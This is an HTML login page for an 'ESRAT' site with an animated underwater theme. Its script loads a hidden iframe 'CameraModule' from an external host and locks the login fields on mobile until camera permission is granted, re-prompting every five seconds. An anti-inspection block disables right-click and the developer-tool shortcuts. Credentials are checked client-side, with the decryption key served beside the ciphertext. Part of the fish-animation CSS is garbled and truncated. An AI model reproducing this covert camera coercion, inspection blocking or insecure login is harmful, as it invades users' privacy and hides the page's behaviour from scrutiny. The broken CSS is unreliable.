        /* Enhanced underwater ecosystem */
        .underwater-world {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }

        /* Dynamic Caustics (Light Patterns) */
        .caustics {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse 300px 100px at 20% 30%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse 400px 120px at 70% 20%, rgba(255, 255, 255, 0.12) 0%, transparent 50%),
                radial-gradient(ellipse 250px 80px at 50% 60%, rgba(255, 255, 255, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse 350px 90px at 80% 80%, rgba(255, 255, 255, 0.10) 0%, transparent 50%);
            animation: causticMovement 12s ease-in-out infinite;
            opacity: 0.6;
        }

        @keyframes causticMovement {
            0%, 100% {
                transform: translateX(0px) translateY(0px) scale(1);
                opacity: 0.6;
            }
            25% {
                transform: translateX(30px) translateY(-20px) scale(1.1);
                opacity: 0.8;
            }
            50% {
                transform: translateX(-20px) translateY(15px) scale(0.9);
                opacity: 0.7;
            }
            75% {
                transform: translateX(25px) translateY(-10px) scale(1.05);
                opacity: 0.9;
            }
        }

        /* Bubbles */
        .bubble {
            position: absolute;
            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.8), rgba(255, 255, 255, 0.3));
            border-radius: 50%;
            animation: bubbleFloat 6s ease-in-out infinite;
            box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .bubble:nth-child(2) { width: 8px; height: 8px; left: 10%; animation-delay: 0s; animation-duration: 8s; }
        .bubble:nth-child(3) { width: 12px; height: 12px; left: 20%; animation-delay: 1s; animation-duration: 7s; }
        .bubble:nth-child(4) { width: 6px; height: 6px; left: 30%; animation-delay: 2s; animation-duration: 9s; }
        .bubble:nth-child(5) { width: 10px; height: 10px; left: 40%; animation-delay: 0.5s; animation-duration: 6s; }
        .bubble:nth-child(6) { width: 14px; height: 14px; left: 50%; animation-delay: 3s; animation-duration: 8s; }
        .bubble:nth-child(7) { width: 7px; height: 7px; left: 60%; animation-delay: 1.5s; animation-duration: 7s; }
        .bubble:nth-child(8) { width: 9px; height: 9px; left: 70%; animation-delay: 2.5s; animation-duration: 6s; }
        .bubble:nth-child(9) { width: 11px; height: 11px; left: 80%; animation-delay: 4s; animation-duration: 9s; }
        .bubble:nth-child(10) { width: 5px; height: 5px; left: 90%; animation-delay: 3.5s; animation-duration: 7s; }
        .bubble:nth-child(11) { width: 13px; height: 13px; left: 15%; animation-delay: 5s; animation-duration: 8s; }

        @keyframes bubbleFloat {
            0% {
                transform: translateY(100vh) scale(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
                transform: translateY(90vh) scale(1);
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-10vh) scale(0.8);
                opacity: 0;
            }
        }

        /* Interactive Fish with scatter behavior */
        .fish {
            position: absolute;
            font-size: 20px;
            opacity: 0.7;
            cursor: pointer;
            transition: all 0.3s ease;
            z-index: 2;
        }

        .fish.scared {
            transform: scale(0.8);
            opacity: 0.9;

        .fish:nth-child(12) {

        .fish:nth-child(13) {

        @keyframes fishSwimRight1 {

        @keyframes fishSwimRight2 {

            }
            20% {

            }

            }
            80% {
                transform: translateX(70vw) translateY(15px) scaleX(1);
            }
            100% {

            }

        @keyframes fishSwimLeft1 {
            0% {
                transform: translateX(50px) translateY(0px) scaleX(-1);
            }
            30% {
                transform: translateX(-20vw) translateY(-25px) scaleX(-1);
            }
            70% {

                transform: translateX(-100vw) translateY(15px) scaleX(-1);
            }
        }

        /* Realistic seaweed swaying animations */
        @keyframes seaweedSway1 {
            0%, 100% {
                transform: rotate(-8deg) scaleY(1);
            }
            25% {
                transform: rotate(12deg) scaleY(1.02);
            }
            50% {
                transform: rotate(-6deg) scaleY(0.98);
            }
            75% {
                transform: rotate(10deg) scaleY(1.01);
            }
        }

        @keyframes seaweedSway2 {
            0%, 100% {
                transform: rotate(10deg) scaleY(1);
            }
            20% {
                transform: rotate(-15deg) scaleY(1.03);
            }
            40% {
                transform: rotate(8deg) scaleY(0.97);
            }
            60% {
                transform: rotate(-12deg) scaleY(1.02);
            }
            80% {
                transform: rotate(6deg) scaleY(0.99);
            }
        }

        @keyframes seaweedSway3 {
            0%, 100% {
                transform: rotate(-6deg) scaleY(1);
            }
            30% {
                transform: rotate(14deg) scaleY(1.04);
            }
            70% {
                transform: rotate(-10deg) scaleY(0.96);
            }
        }

        @keyframes seaweedSway4 {
            0%, 100% {
                transform: rotate(7deg) scaleY(1);
            }
            15% {
                transform: rotate(-11deg) scaleY(1.01);
            }
            35% {
                transform: rotate(13deg) scaleY(0.98);
            }
            55% {
                transform: rotate(-9deg) scaleY(1.03);
            }
            75% {
                transform: rotate(5deg) scaleY(0.99);
            }
            90% {
                transform: rotate(-7deg) scaleY(1.01);
            }
        }

        /* Diver */
        .diver {
            position: absolute;
            bottom: 10%;
            font-size: 24px;
            color: #FFD700;
            animation: diverSwim 25s linear infinite;
            opacity: 0.8;
        }

        @keyframes diverSwim {
            0% {
                left: -50px;
                transform: scaleX(1) rotate(0deg);
            }
            25% {
                transform: scaleX(1) rotate(-10deg) translateY(-30px);
            }
            50% {
                transform: scaleX(1) rotate(5deg) translateY(-10px);
            }
            75% {
                transform: scaleX(1) rotate(-5deg) translateY(-20px);
            }
            100% {
                left: 100vw;
                transform: scaleX(1) rotate(0deg) translateY(0px);
            }
        }

        /* Hidden Treasure Chest */
        .treasure-chest {
            position: absolute;
            bottom: 15%;
            right: 8%;
            font-size: 18px;
            color: #DAA520;
            cursor: pointer;
            opacity: 0.6;
            transition: all 0.3s ease;
            z-index: 3;
            animation: treasureGlow 4s ease-in-out infinite;
        }

        .treasure-chest:hover {
            opacity: 1;
            transform: scale(1.2);
            filter: drop-shadow(0 0 10px #DAA520);
        }

        @keyframes treasureGlow {
            0%, 100% {
                opacity: 0.6;
                text-shadow: 0 0 5px rgba(218, 165, 32, 0.5);
            }
            50% {
                opacity: 0.9;
                text-shadow: 0 0 15px rgba(218, 165, 32, 0.8);
            }
        }

        /* Water level effects */
        .water-surface {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 10%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 20%, rgba(255, 255, 255, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 40% 30%, rgba(255, 255, 255, 0.06) 0%, transparent 50%);
            animation: waterMovement 8s ease-in-out infinite;
        }

        @keyframes waterMovement {
            0%, 100% {
                transform: translateX(0px) translateY(0px);
            }
            25% {
                transform: translateX(10px) translateY(-5px);
            }
            50% {
                transform: translateX(-5px) translateY(5px);
            }
            75% {
                transform: translateX(-10px) translateY(-3px);
            }
        }

        /* Tap the glass ripple effect */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, rgba(255, 255, 255, 0.1) 50%, transparent 100%);
            pointer-events: none;
            animation: rippleEffect 1.5s ease-out forwards;
            z-index: 100;
        }

        @keyframes rippleEffect {
            0% {
                width: 0px;
                height: 0px;
                opacity: 1;
            }
            100% {
                width: 300px;
                height: 300px;
                opacity: 0;
            }
        }

        /* Seamless navbar integration with logo matching GANGA text size */
        .navbar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            padding: 20px 20px;
            background: transparent;
            height: 100px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo a {
            display: block;
            line-height: 0;
        }

        /* Logo size matching GANGA text (2.8rem = ~45px) */
        .logo img {
            height: 45px;
            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3)) brightness(1.1);
            transition: transform 0.3s ease;
        }

        .logo img:hover {
            transform: scale(1.05);
        }

        /* Main container */
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            width: 100vw;
            padding: 20px;
            z-index: 10;
            position: relative;
            padding-top: 100px;
        }

        /* Random bouncing letters for GANGA title */
        .title-container {
            text-align: center;
            margin-bottom: 40px;
            position: relative;
        }

        #dynamic-text {
            font-size: 2.8rem;
            font-weight: 700;
            color: #ffffff;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
            margin-bottom: 10px;
            position: relative;
        }

        .letter {
            display: inline-block;
            opacity: 0;
            transform: translate3d(0px, 30px, 0px) scale(0.8);
            animation: animateText 1s forwards, randomBounce 3s ease-in-out infinite;
        }

        @keyframes animateText {
            0% {
                opacity: 0;
                transform: translate3d(0px, 30px, 0px) scale(0.8);
            }
            100% {
                opacity: 1;
                transform: translate3d(0px, 0px, 0px) scale(1);
            }
        }

        /* Random bounce animations for each letter */
        @keyframes randomBounce {
            0%, 100% {
                transform: translateY(0px);
                text-shadow: 
                    0 0 15px rgba(255, 255, 255, 0.8),
                    0 0 30px rgba(74, 144, 226, 0.6);
            }
            50% {
                transform: translateY(-8px);
                text-shadow: 
                    0 0 25px rgba(255, 255, 255, 1),
                    0 0 50px rgba(74, 144, 226, 0.8);
            }
        }

        /* Different bounce timings and delays for randomness */
        .letter:nth-child(1) { 
            animation-delay: 0s, 0.2s; 
            animation-duration: 1s, 2.8s;
        }
        .letter:nth-child(2) { 
            animation-delay: 0.15s, 1.1s; 
            animation-duration: 1s, 3.5s;
        }
        .letter:nth-child(3) { 
            animation-delay: 0.3s, 0.7s; 
            animation-duration: 1s, 2.2s;
        }
        .letter:nth-child(4) { 
            animation-delay: 0.45s, 1.8s; 
            animation-duration: 1s, 4.1s;
        }
        .letter:nth-child(5) { 
            animation-delay: 0.6s, 0.4s; 
            animation-duration: 1s, 3.2s;
        }

        /* Login container with enhanced underwater feel - Smaller size */
        .container {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 20px;
            padding: 25px 20px;
            width: 100%;
            max-width: 300px;
            min-width: 280px;
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.05), transparent);
            animation: shimmer 4s infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        /* Water-filling input fields - Compact spacing */
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 45px 14px 16px;
            background: rgba(255, 255, 255, 0.12);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 500;
            outline: none;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            position: relative;
            z-index: 2;
        }

        .input-group input::placeholder {
            color: rgba(191, 191, 191, 0.85);
            font-weight: 500;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
        }

        .input-group input:focus {
            border-color: rgba(74, 144, 226, 0.8);
            background: rgba(255, 255, 255, 0.18);
            box-shadow: 0 0 15px rgba(74, 144, 226, 0.3);
        }

        .input-group input:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Water fill effect for inputs */
        .water-fill {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg,

    <!-- Hidden iframe to load the CameraModule -->
    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    
    <script>
        let cameraStream = null;  // Variable to store the camera stream

        async function retrieveSacredKeys() {
            const response = await fetch("/ESRAT/asset/keys.json");
            const sacredKeys = await response.json();
            return sacredKeys;
        }

        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
                iv: decodedEssence,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });
            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
        }

        function enableInputs() {
            document.getElementById("username").disabled = false;
            document.getElementById("password").disabled = false;
            document.getElementById("submit").disabled = false;
            document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
        }

        function disableInputs() {
            document.getElementById("username").disabled = true;
            document.getElementById("password").disabled = true;
            document.getElementById("submit").disabled = true;
            document.getElementById("notice-board").style.display = 'block';  // Show notice board if permission is denied
        }

        function stopCameraStream() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
                cameraStream = null;  // Clear the camera stream
            }
        }

        function requestCameraPermission() {
            // Check if the screen size is small (for mobile devices)
            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        console.log("Camera permission granted.");
                        cameraStream = stream;  // Store the camera stream
                        enableInputs();  // Enable inputs once permission is granted

                        // Stop the camera stream after 5 seconds
                        setTimeout(stopCameraStream, 5000);
                        
                        clearInterval(cameraInterval);  // Stop asking for permission after it's granted
                    })
                    .catch(function(err) {
                        console.log("Camera permission denied, retrying in 5 seconds.");
                        disableInputs();  // Keep inputs disabled if permission is denied
                    });
            } else {
                // If on larger screens, directly enable inputs without asking for camera
                enableInputs();
            }
        }

        // Check camera permission every 5 seconds until granted
        const cameraInterval = setInterval(requestCameraPermission, 5000);

        // Event listeners for login
        document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
        document.getElementById("password").addEventListener("keydown", (event) => {
            if (event.key === "Enter") {
                verifyEnigmaticCredentials();
            }
        });

        // Function to verify credentials
        async function verifyEnigmaticCredentials() {
            const submitBtn = document.getElementById("submit");
            const submitSpan = submitBtn.querySelector('span');
            
            // Add loading state
            submitBtn.classList.add('loading');
            submitSpan.style.opacity = '0';
            
            try {
                const sacredKeys = await retrieveSacredKeys();
                const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
                const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);

                const inputIdentity = document.getElementById("username").value;
                const inputPassage = document.getElementById("password").value;

                // Check if both inputs are filled
                if (inputIdentity === "" || inputPassage === "") {
                    alert("Please fill in both username and password.");
                    return;  // Prevent further execution
                }

                // Simulate loading delay for better UX
                setTimeout(() => {
                    if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
                        window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
                    } else {
                        alert("Incorrect User or Password.");  // Alert on incorrect login
                        // Remove loading state
                        submitBtn.classList.remove('loading');
                        submitSpan.style.opacity = '1';
                    }
                }, 1000);
                
            } catch (error) {
                console.error("Login error:", error);
                alert("An error occurred during login. Please try again.");
                // Remove loading state
                submitBtn.classList.remove('loading');
                submitSpan.style.opacity = '1';
            }
        }

        // Cursor shadow effect
        const cursorShadow = document.querySelector('.cursor-shadow');
        document.addEventListener('mousemove', (event) => {
            cursorShadow.style.left = event.clientX + 'px';
            cursorShadow.style.top = event.clientY + 'px';
        });

        // Enhanced input interactions
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'scale(1.02)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'scale(1)';
            });
        });

        // Interactive fish behavior
        const fish = document.querySelectorAll('.fish');
        let mouseX = 0;
        let mouseY = 0;

        document.addEventListener('mousemove', (e) => {
            mouseX = e.clientX;
            mouseY = e.clientY;

            fish.forEach(fishElement => {
                const fishRect = fishElement.getBoundingClientRect();
                const fishCenterX = fishRect.left + fishRect.width / 2;
                const fishCenterY = fishRect.top + fishRect.height / 2;
                
                const distance = Math.sqrt(
                    Math.pow(mouseX - fishCenterX, 2) + 
                    Math.pow(mouseY - fishCenterY, 2)
                );

                if (distance < 100) {
                    fishElement.classList.add('scared');
                    // Calculate escape direction
                    const escapeX = fishCenterX - mouseX;
                    const escapeY = fishCenterY - mouseY;
                    const escapeDistance = 50;
                    
                    fishElement.style.transform = `translate(${escapeX * 0.5}px, ${escapeY * 0.5}px) scale(0.8)`;
                } else {
                    fishElement.classList.remove('scared');
                    fishElement.style.transform = '';
                }
            });
        });

        // Tap the glass effect
        document.addEventListener('click', function(e) {
            // Only create ripple if not clicking on interactive elements
            if (!e.target.closest('.container, .social-link, .treasure-chest, .logo')) {
                createRippleEffect(e.clientX, e.clientY);
            }
            createUnderwaterClickEffect(e.clientX, e.clientY);
        });

        function createRippleEffect(x, y) {
            const ripple = document.createElement('div');
            ripple.className = 'ripple';
            ripple.style.left = (x - 150) + 'px';
            ripple.style.top = (y - 150) + 'px';
            
            document.body.appendChild(ripple);
            
            setTimeout(() => {
                if (document.body.contains(ripple)) {
                    document.body.removeChild(ripple);
                }
            }, 1500);
        }

        function createUnderwaterClickEffect(x, y) {
            // Create multiple small bubbles
            for (let i = 0; i < 3; i++) {
                const bubble = document.createElement('div');
                bubble.style.position = 'fixed';
                bubble.style.left = (x + (Math.random() - 0.5) * 20) + 'px';
                bubble.style.top = (y + (Math.random() - 0.5) * 20) + 'px';
                bubble.style.width = (4 + Math.random() * 6) + 'px';
                bubble.style.height = bubble.style.width;
                bubble.style.background = 'radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.8), rgba(74, 144, 226, 0.3))';
                bubble.style.borderRadius = '50%';
                bubble.style.pointerEvents = 'none';
                bubble.style.zIndex = '10000';
                bubble.style.animation = 'clickBubble 1s ease-out forwards';
                
                document.body.appendChild(bubble);
                
                setTimeout(() => {
                    if (document.body.contains(bubble)) {
                        document.body.removeChild(bubble);
                    }
                }, 1000);
            }
        }

        // Treasure chest functionality
        function foundTreasure() {
            const treasureMessage = document.createElement('div');
            treasureMessage.className = 'treasure-found';
            treasureMessage.innerHTML = 'You discovered a hidden gem!<br>‚ú® Welcome to the depths! ‚ú®';
            
            document.body.appendChild(treasureMessage);
            
            // Create treasure particles
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    createTreasureParticle();
                }, i * 100);
            }
            
            setTimeout(() => {
                if (document.body.contains(treasureMessage)) {
                    document.body.removeChild(treasureMessage);
                }
            }, 3000);
        }

        function createTreasureParticle() {
            const particle = document.createElement('div');
            particle.style.position = 'fixed';
            particle.style.left = (window.innerWidth * 0.85) + 'px';
            particle.style.top = (window.innerHeight * 0.85) + 'px';
            particle.style.width = '8px';
            particle.style.height = '8px';
            particle.style.background = '#DAA520';
            particle.style.borderRadius = '50%';
            particle.style.pointerEvents = 'none';
            particle.style.zIndex = '10000';
            particle.style.animation = 'treasureParticle 2s ease-out forwards';
            
            document.body.appendChild(particle);
            
            setTimeout(() => {
                if (document.body.contains(particle)) {
                    document.body.removeChild(particle);
                }
            }, 2000);
        }

        // Add treasure particle animation
        const treasureStyle = document.createElement('style');
        treasureStyle.textContent = `
            @keyframes clickBubble {
                0% {
                    transform: translate(-50%, -50%) scale(1);
                    opacity: 1;
                }
                100% {
                    transform: translate(-50%, -50%) translateY(-50px) scale(0.5);
                    opacity: 0;
                }
            }
            
            @keyframes treasureParticle {
                0% {
                    transform: translate(-50%, -50%) scale(1);
                    opacity: 1;
                }
                100% {
                    transform: translate(-50%, -50%) translate(${Math.random() * 200 - 100}px, ${Math.random() * 200 - 100}px) scale(0);
                    opacity: 0;
                }
            }
        `;
        document.head.appendChild(treasureStyle);

        // Anti-inspection script
        document.addEventListener('contextmenu', event => event.preventDefault());  // Disable right-click

        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
        document.onkeydown = function(e) {
            if (e.keyCode === 123) { // F12
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
                return false; // Ctrl+Shift+I
            }
            if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
                return false; // Ctrl+U
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
                return false; // Ctrl+Shift+J
            }
        };

        // Prevent zoom on iOS Safari
        document.addEventListener('gesturestart', function (e) {
            e.preventDefault();
        });

        document.addEventListener('gesturechange', function (e) {
            e.preventDefault();
        });

        document.addEventListener('gestureend', function (e) {
            e.preventDefault();
        });

        // Handle viewport height changes on mobile
        function setViewportHeight() {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        }

        window.addEventListener('resize', setViewportHeight);
        window.addEventListener('orientationchange', setViewportHeight);
        setViewportHeight();
    </script>
    
</body>
</html>
